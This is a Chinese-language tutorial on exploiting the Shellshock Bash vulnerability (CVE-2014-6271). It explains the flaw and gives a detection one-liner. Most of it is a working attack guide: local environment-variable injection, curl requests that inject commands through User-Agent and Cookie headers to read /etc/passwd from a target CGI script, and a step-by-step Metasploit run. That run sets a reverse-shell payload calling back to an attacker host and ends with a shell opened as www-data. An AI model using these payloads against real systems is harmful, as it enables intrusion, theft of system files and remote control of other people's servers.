Bash 4.3 及更早版本基本确认可以使用

Shellshock漏洞（CVE-2014-6271及其后续相关漏洞）是Bash解释器的严重安全漏洞，允许攻击者通过环境变量注入恶意代码并执行任意命令。以下是其主要利用方法及相关信息：
 一、漏洞原理
当Bash处理包含函数定义的环境变量时，会错误地执行函数定义后的附加命令，导致命令注入。例如，环境变量值形如 `() { :; }; <恶意命令>` 时，Bash会在解析时执行 `<恶意命令>`。

 二、检测是否存在漏洞
1. 命令行检测  
   在终端执行以下命令，若输出包含 ` vulnerable` 或异常结果，则存在漏洞：  
   ```bash
   env x='() { :; }; echo vulnerable' bash -c "echo this is a test"
   ```
   正常输出：`this is a test`  
   漏洞存在时输出：`vulnerable\nthis is a test`（或类似）

2. 检查Bash版本  
   漏洞影响Bash 1.3到4.3版本（版本号 < 4.3补丁17），查看版本：  
   ```bash
   bash --version
   ```

 三、利用方法
 1. 命令行直接利用（本地/远程shell）
通过导出恶意环境变量并触发Bash解析：  
```bash
# 导出包含恶意命令的环境变量（例如执行whoami）
export TEST='() { :; }; /bin/whoami'
# 执行任意命令（触发Bash解析环境变量）
bash -c "echo hello"
```
此时`/bin/whoami`会被执行，输出当前用户。


 2. Web场景监测和利用（HTTP头注入）
监测：
curl -H "User-Agent: () { :; }; echo 'Shellshock Vulnerable'" http://目标IP/cgi-bin/任意文件.cgi
# 或
curl -H "Cookie: () { :; }; echo 'Vulnerable'" http://目标IP/cgi-bin/任意文件.cgi

利用：
许多Web服务器（如CGI脚本、FastCGI）会将HTTP头（如User-Agent、Cookie）转换为环境变量，攻击者可通过构造恶意请求触发漏洞：  
- 攻击示例（curl）：  
  ```bash
  curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" http://目标URL/cgi-bin/脚本
  ```
  若服务器使用Bash处理CGI环境变量，会执行`/bin/cat /etc/passwd`，返回敏感文件内容。

- Metasploit模块利用：  
  使用模块 `exploit/multi/http/apache_mod_cgi_bash_env_exec`，配置目标URL后执行攻击，可获取远程命令执行权限。



1. 启动Metasploit
```bash
msfconsole
```

 2. 加载模块
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

 3. 查看模块信息与参数
```bash
show info          # 查看模块描述、作者、依赖等信息
show options       # 查看需要配置的参数
```
关键参数说明：  
- RHOSTS：目标主机IP或域名（必填，如`192.168.1.100`）  
- TARGETURI：目标CGI脚本所在路径（默认`/cgi-bin/`，需根据实际情况调整，如`/cgi-bin/test.cgi`）  
- HTTPMETHOD：请求方法（默认`GET`，可尝试`POST`）  
- USER_AGENT：自定义User-Agent头（默认包含漏洞利用载荷，一般无需修改）  

 4. 配置目标参数
```bash
set RHOSTS 192.168.1.100    # 设置目标IP
set TARGETURI /cgi-bin/     # 设置CGI脚本目录（若已知具体脚本，如`/cgi-bin/php.cgi`，需完整填写）
```

 5. 选择Payload（有效载荷）
该模块支持多种Payload，用于获取目标Shell或执行命令。常用Payload：  
```bash
set payload cmd/unix/reverse_perl   # 反向Shell（Perl版本，兼容性强）
# 或
set payload cmd/unix/reverse_bash   # Bash反向Shell（需目标支持Bash）
```
设置Payload后，需配置反向连接参数（以反向Shell为例）：  
```bash
set LHOST 192.168.1.5     # 攻击者主机IP（本地监听IP）
set LPORT 4444            # 监听端口（默认4444）
```

 6. 运行攻击
```bash
exploit                  # 启动攻击
```
- 若目标存在漏洞，Payload会被执行，攻击者将获得目标的Shell连接（如`meterpreter`或普通Shell）。


示例：获取反向Shell
```plaintext
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.0.0.10
RHOSTS => 10.0.0.10
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/
TARGETURI => /cgi-bin/
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set payload cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 10.0.0.5
LHOST => 10.0.0.5
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] Command shell session 1 opened (10.0.0.5:4444 -> 10.0.0.10:54322) at 2025-05-08 15:30:00 +0800

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

